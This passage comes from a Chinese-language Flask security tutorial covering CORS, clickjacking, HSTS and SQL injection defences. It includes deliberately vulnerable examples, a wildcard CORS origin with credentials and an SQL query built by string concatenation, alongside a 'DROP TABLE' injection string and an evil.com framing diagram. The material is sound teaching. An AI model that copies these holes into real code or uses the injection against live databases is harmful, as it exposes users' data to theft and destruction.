from flask import Flask, request, jsonify
from typing import Any

app: Flask = Flask(__name__)


# ❌ 危险配置：Access-Control-Allow-Origin: *
@app.after_request
def dangerous_cors(response):
    response.headers["Access-Control-Allow-Origin"] = "*"
    response.headers["Access-Control-Allow-Credentials"] = "true"
    # 浏览器会拒绝此组合 — credentials 与 wildcard origin 不兼容
    # 但如果绕过了，任意网站都可以访问用户数据
    return response


# ✅ 安全配置：白名单策略
TRUSTED_ORIGINS: set[str] = {
    "https://myapp.com",
    "https://www.myapp.com",
    "https://admin.myapp.com",
}


@app.after_request
def secure_cors(response):
    origin: str | None = request.headers.get("Origin")
    if origin and origin in TRUSTED_ORIGINS:
        response.headers["Access-Control-Allow-Origin"] = origin
    else:
        response.headers["Access-Control-Allow-Origin"] = "https://myapp.com"

    response.headers["Access-Control-Allow-Methods"] = "GET, POST, PUT, DELETE"
    response.headers["Access-Control-Allow-Headers"] = "Content-Type, Authorization"
    response.headers["Access-Control-Allow-Credentials"] = "true"
    response.headers["Access-Control-Max-Age"] = "3600"
    return response


@app.route("/api/cors-test", methods=["OPTIONS"])
def cors_preflight():
    """处理 OPTIONS 预检请求"""
    response = jsonify({"status": "ok"})
    origin: str | None = request.headers.get("Origin")
    if origin and origin in TRUSTED_ORIGINS:
        response.headers["Access-Control-Allow-Origin"] = origin
    response.headers["Access-Control-Allow-Methods"] = "GET, POST, PUT, DELETE"
    response.headers["Access-Control-Allow-Headers"] = "Content-Type, Authorization"
    response.headers["Access-Control-Allow-Credentials"] = "true"
    return response
```

**CORS 配置检查清单：**

| 配置项 | 危险值 | 安全值 | 原因 |
|--------|--------|--------|------|
| `Allow-Origin` | `*`（配合 credentials） | 白名单具体域名 | 防止任意网站读取响应 |
| `Allow-Credentials` | `true`（配合 `Origin: *`） | 仅在需要时启用 | Cookie 认证需要 |
| `Allow-Methods` | `*` 或过多方法 | 仅必需的方法 | 减少攻击面 |
| `Allow-Headers` | `*`（过于宽松） | 列出具体头部 | 防止头部注入 |
| `Max-Age` | 过长（如 86400） | 3600（1 小时） | 平衡性能与安全性 |

### 5.6 点击劫持防御（Clickjacking）

点击劫持是指攻击者通过 `<iframe>` 嵌入受害页面，诱导用户点击：

```
点击劫持攻击原理：
┌─────────────────────────────────────────────────────────────────┐
│                                                                 │
│  攻击者页面 evil.com                                              │
│  ┌────────────────────────────────────────────────────────────┐ │
│  │                                                            │ │
│  │  "点击领取奖品" 按钮（诱饵）                                  │ │
│  │                                                            │ │
│  │  ┌──────────────────────────────────────────────────────┐  │ │
│  │  │  iframe: bank.com/transfer?to=hacker&amount=10000    │  │ │
│  │  │  opacity: 0.01（几乎不可见）                          │  │ │
│  │  │  position: absolute                                 │  │ │
│  │  │  覆盖在"领取奖品"按钮上方                              │  │ │
│  │  └──────────────────────────────────────────────────────┘  │ │
│  │                                                            │ │
│  │  用户以为点击"领取奖品"，实际点击了"确认转账"                 │ │
│  └────────────────────────────────────────────────────────────┘ │
│                                                                 │
│  防御方式：                                                       │
│  1. X-Frame-Options: DENY（禁止任何 iframe）                     │
│  2. CSP: frame-ancestors 'none'（比 X-Frame-Options 更强）       │
│  3. framebusting JS（传统方案，可被绕过）                         │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

```python
# clickjacking_defense.py
"""点击劫持防御实现"""
from flask import Flask, Response
from typing import Any

app: Flask = Flask(__name__)


@app.after_request
def prevent_clickjacking(response: Response) -> Response:
    """添加防点击劫持的响应头"""
    # 方式一：X-Frame-Options（老方案，浏览器支持好）
    response.headers["X-Frame-Options"] = "DENY"
    # 可选值：DENY（完全禁止）、SAMEORIGIN（仅同源允许）

    # 方式二：CSP frame-ancestors（现代方案，更强大）
    response.headers["Content-Security-Policy"] = (
        "frame-ancestors 'none'; "  # 禁止所有嵌入
        # "frame-ancestors 'self';"  # 仅允许同源
        # "frame-ancestors https://trusted.com;"  # 白名单
    )
    return response


# JavaScript framebusting（兜底方案，不推荐作为唯一防御）
FRAMEBUST_JS: str = """
<script>
if (self !== top) {
    top.location = self.location;
}
</script>
"""
```

### 5.7 HTTPS 强制与 HSTS 深入

```python
# https_enforcement.py
"""HTTPS 强制与 HSTS 配置"""
from flask import Flask, request, redirect, Response
from typing import Any

app: Flask = Flask(__name__)


@app.before_request
def force_https() -> Any:
    """强制所有请求使用 HTTPS"""
    # 检查是否是 HTTP 请求（通过 X-Forwarded-Proto 或 request.scheme）
    forwarded_proto: str | None = request.headers.get("X-Forwarded-Proto")
    if request.scheme == "http" or forwarded_proto == "http":
        url: str = request.url.replace("http://", "https://", 1)
        return redirect(url, code=301)


@app.after_request
def set_hsts(response: Response) -> Response:
    """设置 HSTS（HTTP Strict Transport Security）"""
    # 仅在 HTTPS 下设置 HSTS
    if request.scheme == "https":
        response.headers["Strict-Transport-Security"] = (
            "max-age=31536000; "   # 1 年
            "includeSubDomains; "  # 包含子域名
            "preload"              # 加入 HSTS preload 列表
        )
    return response
```

**HSTS 最佳实践：**

```
HSTS 部署策略：
┌─────────────────────────────────────────────────────────────────┐
│                                                                 │
│  阶段 1：测试（短期 max-age）                                      │
│  max-age=86400; includeSubDomains                               │
│                                                                 │
│  阶段 2：逐步增加                                                 │
│  max-age=604800; includeSubDomains（1 周）                       │
│                                                                 │
│  阶段 3：长期（发现问题后仍能回滚）                                 │
│  max-age=2592000; includeSubDomains（30 天）                     │
│                                                                 │
│  阶段 4：生产（确认无误）                                          │
│  max-age=31536000; includeSubDomains; preload（1 年 + preload）  │
│                                                                 │
│  ⚠️  警告：preload 一旦提交到 Chromium 列表，移除非常困难          │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 5.8 SQL 注入深层防御（SQLAlchemy 参数化查询）

```python
# sql_injection_defense.py
"""SQLAlchemy 防范 SQL 注入的深入分析"""
from flask import Flask, request, jsonify
from sqlalchemy import create_engine, text, Table, MetaData
from typing import Any

app: Flask = Flask(__name__)
engine = create_engine("postgresql://user:pass@localhost/db")


# ❌ 危险：字符串拼接
@app.route("/search/dangerous")
def search_dangerous():
    keyword: str = request.args.get("q", "")
    sql: str = f"SELECT * FROM articles WHERE title LIKE '%{keyword}%'"
    # 攻击输入：'; DROP TABLE articles; --
    with engine.connect() as conn:
        result = conn.execute(text(sql))  # 直接执行拼接后的 SQL
        return jsonify([dict(row) for row in result])


# ✅ 安全：参数化查询
@app.route("/search/safe")
def search_safe():
    keyword: str = request.args.get("q", "")
    # SQLAlchemy 参数化查询自动转义特殊字符
    with engine.connect() as conn:
        result = conn.execute(
            text("SELECT * FROM articles WHERE title LIKE :kw"),
            {"kw": f"%{keyword}%"},
        )
        return jsonify([dict(row) for row in result])


# ✅ 更安全：ORM 方式
from sqlalchemy import select, Column, String, Integer
from sqlalchemy.orm import DeclarativeBase, Session


class Base(DeclarativeBase):
    pass


class Article(Base):
    __tablename__ = "articles"
    id: int = Column(Integer, primary_key=True)  # type: ignore[assignment]
    title: str = Column(String)  # type: ignore[assignment]


@app.route("/search/orm")
def search_orm():
    keyword: str = request.args.get("q", "%")
    with Session(engine) as session:
        # ORM 自动参数化，完全解决 SQL 注入
        stmt = select(Article).where(Article.title.like(f"%{keyword}%"))
        result = session.execute(stmt).scalars().all()
        return jsonify([{"id": a.id, "title": a.title} for a in result])
```

**SQL 注入防护层级：**

| 层级 | 方案 | 防御能力 | 注意事项 |
|------|------|---------|---------|
| 第一层 | ORM（SQLAlchemy ORM） | 最强 | 自动参数化，推荐 |
| 第二层 | Core（SQLAlchemy text + bind params） | 强 | 需手动传入参数 |
| 第三层 | 原始 SQL + 参数化 | 中 | 担心错误拼接 |
| 危险层 | 字符串拼接 SQL | 无 | 绝对禁止 |

### 5.9 调试与排错实战：安全排查案例

**场景：** 用户报告账号被盗，排查是否存在安全漏洞。

```
安全排查流程：
┌─────────────────────────────────────────────────────────────────┐
│                                                                 │
│  Step 1：检查认证日志                                            │
│  搜索该用户在盗窃时间段的所有登录日志                              │
│  → 发现一条来自异常 IP 的成功登录                                │
│                                                                 │
│  Step 2：检查 Session 配置                                       │
│  SESSION_COOKIE_SECURE = False   ← 漏洞！                        │
│  SESSION_COOKIE_HTTPONLY = True                                 │
│  用户在不安全的公共 WiFi 中使用时，Cookie 被劫持                  │
│                                                                 │
│  Step 3：审计响应头                                              │
│  curl -I https://app.example.com                                │
│  缺少 CSP、HSTS、X-Frame-Options                                │
│                                                                 │
│  Step 4：修复                                                    │
│  1. 启用 SESSION_COOKIE_SECURE = True                           │
│  2. 添加安全响应头                                               │
│  3. 强制全站 HTTPS                                              │
│  4. 登录失败后检查异常行为                                       │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

| 发现 | 严重度 | 修复 | 验证方式 |
|------|--------|------|---------|
| Cookie Secure=False | 高 | 启用 `SESSION_COOKIE_SECURE=True` | `curl -I` 检查 Set-Cookie |
| 缺少安全头 | 中 | 添加 CSP/HSTS/X-Frame-Options | `curl -I` 检查响应头 |
| 未使用参数化查询 | 高 | 改用 SQLAlchemy ORM | 代码审查 |
| DEBUG=True 在生产 | 高 | 环境变量控制 | 访问不存在的路由确认 |

## 本章总结

```
┌─────────────────────────────────────────────────────────────────┐
│                    Flask 安全防御体系                            │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  第一层：输入验证                                                │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │  XSS → Jinja2 autoescape + markupsafe.escape()          │   │
│  │  注入 → ORM 参数化查询                                   │   │
│  │  文件 → secure_filename() + 白名单 + MIME 检查          │   │
│  │  JSON → MAX_CONTENT_LENGTH + 字段验证                   │   │
│  └─────────────────────────────────────────────────────────┘   │
│                            │                                    │
│                            ↓                                    │
│  第二层：请求验证                                                │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │  CSRF → Flask-WTF CSRFProtect / 手动 Token              │   │
│  │  Host → 白名单验证 + 配置 BASE_URL                      │   │
│  │  认证 → Flask-Login + 权限中间件                        │   │
│  └─────────────────────────────────────────────────────────┘   │
│                            │                                    │
│                            ↓                                    │
│  第三层：传输安全                                                │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │  HTTPS → 全站强制 + HSTS                                │   │
│  │  Cookie → Secure + HttpOnly + SameSite                  │   │
│  │  Headers → CSP + X-Frame-Options + nosniff              │   │
│  └─────────────────────────────────────────────────────────┘   │
│                            │                                    │
│                            ↓                                    │
│  第四层：数据安全                                                │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │  密码 → bcrypt/argon2 + 随机盐值                        │   │
│  │  Session → 强 SECRET_KEY + 不存敏感数据                 │   │
│  │  日志 → 不记录密码/Token                                │   │
│  └─────────────────────────────────────────────────────────┘   │
│                            │                                    │
│                            ↓                                    │
│  持续保障                                                        │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │  依赖审计 → pip-audit / safety                          │   │
│  │  安全测试 → 渗透测试 + 代码审查                         │   │
│  │  监控告警 → 异常检测 + 安全事件日志                     │   │
│  └─────────────────────────────────────────────────────────┘   │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**核心原则：**

| 原则 | 说明 | 示例 |
|------|------|------|
| 安全默认值 | 默认开启安全防护 | Jinja2 autoescape 默认开启 |
| 纵深防御 | 多层防护，不依赖单一机制 | XSS 防御 = 转义 + CSP + HttpOnly |
| 最小权限 | 只给必要的权限 | 文件上传目录不可执行 |
| 不信任输入 | 所有用户输入视为不可信 | 转义、验证、白名单 |
| 失败安全 | 出错时倾向拒绝而非允许 | CSRF 验证失败返回 403 |

**安全工具推荐：**

| 工具 | 用途 | 安装 |
|------|------|------|
| `flask-talisman` | 自动安全头 | `pip install flask-talisman` |
| `flask-wtf` | CSRF 保护 | `pip install flask-wtf` |
| `bcrypt` | 密码哈希 | `pip install bcrypt` |
| `pip-audit` | 依赖漏洞扫描 | `pip install pip-audit` |
| `bandit` | 静态安全分析 | `pip install bandit` |
